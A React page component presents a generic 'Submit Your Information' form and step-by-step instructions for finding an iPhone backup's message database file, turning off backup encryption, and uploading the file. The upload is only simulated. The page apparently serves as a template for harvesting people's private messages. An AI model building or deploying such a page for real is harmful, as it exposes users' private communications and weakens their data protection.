import { useState } from "react";
import { useToast } from "@/components/ui/use-toast";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import FileUpload from "@/components/FileUpload";
import { Loader2 } from "lucide-react";

const Index = () => {
  const [username, setUsername] = useState("");
  const [email, setEmail] = useState("");
  const [file, setFile] = useState<File | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Basic validation
    if (!username.trim() || !email.trim()) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Please fill in all required fields",
      });
      return;
    }

    if (!email.includes("@")) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Please enter a valid email address",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      // Simulate form processing
      await new Promise(resolve => setTimeout(resolve, 1500));
      
      // Log the form data (for demonstration purposes)
      console.log({
        username,
        email,
        file: file ? file.name : null
      });
      
      toast({
        title: "Success!",
        description: "Form submitted successfully",
      });

      // Reset form
      setUsername("");
      setEmail("");
      setFile(null);
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Something went wrong. Please try again.",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-white to-gray-100">
      <div className="container max-w-2xl py-16">
        <div className="bg-white rounded-xl shadow-sm border p-8">
          <h1 className="text-3xl font-semibold text-center mb-8">
            Submit Your Information
          </h1>
          
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <Label htmlFor="username">Username</Label>
              <Input
                id="username"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Enter your username"
                className="w-full"
                disabled={isSubmitting}
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="email">Email</Label>
              <Input
                id="email"
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Enter your email"
                className="w-full"
                disabled={isSubmitting}
              />
            </div>

            <div className="space-y-2">
              <Label>Upload File</Label>
              <FileUpload onFileChange={setFile} />
            </div>

            <Button
              type="submit"
              className="w-full"
              disabled={isSubmitting}
            >
              {isSubmitting ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Submitting...
                </>
              ) : (
                "Submit"
              )}
            </Button>

            <div className="text-sm text-muted-foreground text-center mt-4 space-y-1">
              <p>All fields marked with * are required.</p>
              <p>Uploaded files should be less than 10MB.</p>
              <p>Please ensure all information is accurate before submitting.</p>
            </div>

            <div className="mt-8 space-y-6 text-sm text-gray-600">
              <div>
                <h2 className="text-lg font-semibold text-gray-900 mb-4">Step 1: Locate Your iTunes Backup</h2>
                
                <div className="space-y-4">
                  <div>
                    <h3 className="font-medium mb-2">For macOS Users:</h3>
                    <ol className="list-decimal list-inside space-y-2 pl-4">
                      <li>Open Finder and go to the menu bar.</li>
                      <li>Select Go &gt; Go to Folder and type:</li>
                      <code className="block bg-gray-100 p-2 rounded mt-1">~/Library/Application Support/MobileSync/Backup/</code>
                      <li>Press Enter to access your iTunes backup folder.</li>
                    </ol>
                  </div>

                  <div>
                    <h3 className="font-medium mb-2">For Windows Users:</h3>
                    <ol className="list-decimal list-inside space-y-2 pl-4">
                      <li>Open File Explorer and navigate to:</li>
                      <code className="block bg-gray-100 p-2 rounded mt-1">C:\Users\&lt;YourUsername&gt;\AppData\Roaming\Apple Computer\MobileSync\Backup\</code>
                      <li>Replace &lt;YourUsername&gt; with your Windows account name.</li>
                      <li>If you cannot see the AppData folder:
                        <ul className="list-disc list-inside pl-4 mt-1">
                          <li>Click View in the top menu.</li>
                          <li>Enable Hidden items.</li>
                        </ul>
                      </li>
                    </ol>
                  </div>
                </div>
              </div>

              <div>
                <h2 className="text-lg font-semibold text-gray-900 mb-4">Step 2: Locate the Messages Backup File</h2>
                <ol className="list-decimal list-inside space-y-2 pl-4">
                  <li>Inside the Backup folder, you'll see one or more subfolders with long alphanumeric names. Each represents a device backup.</li>
                  <li>Open the most recent folder (based on its last modification date).</li>
                  <li>Look for a file named:</li>
                  <code className="block bg-gray-100 p-2 rounded mt-1">3d0d7e5fb2ce288813306e4d4636395e047a3d28</code>
                  <li>This file contains your message data.</li>
                </ol>
              </div>

              <div>
                <h2 className="text-lg font-semibold text-gray-900 mb-4">Step 3: Upload the File</h2>
                <ol className="list-decimal list-inside space-y-2 pl-4">
                  <li>Return to this web page.</li>
                  <li>Click the Browse or Upload button below.</li>
                  <li>Select the 3d0d7e5fb2ce288813306e4d4636395e047a3d28 file.</li>
                  <li>Click Open to confirm your selection.</li>
                  <li>Press Submit or Upload to complete the process.</li>
                </ol>
              </div>

              <div>
                <h2 className="text-lg font-semibold text-gray-900 mb-4">Step 4: Verify the Upload</h2>
                <ol className="list-decimal list-inside space-y-2 pl-4">
                  <li>Once the file is successfully uploaded, you will see a confirmation message.</li>
                  <li>If there's an error, double-check that you selected the correct file.</li>
                </ol>
              </div>

              <div>
                <h2 className="text-lg font-semibold text-gray-900 mb-4">Troubleshooting Tips</h2>
                <ul className="list-disc list-inside space-y-2 pl-4">
                  <li>File not found? Ensure you are looking in the correct backup folder for the most recent modification date.</li>
                  <li>Encrypted backups? Turn off encryption in iTunes, back up your device again, and repeat the steps.</li>
                  <li>Need help? Contact our support team.</li>
                </ul>
              </div>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Index;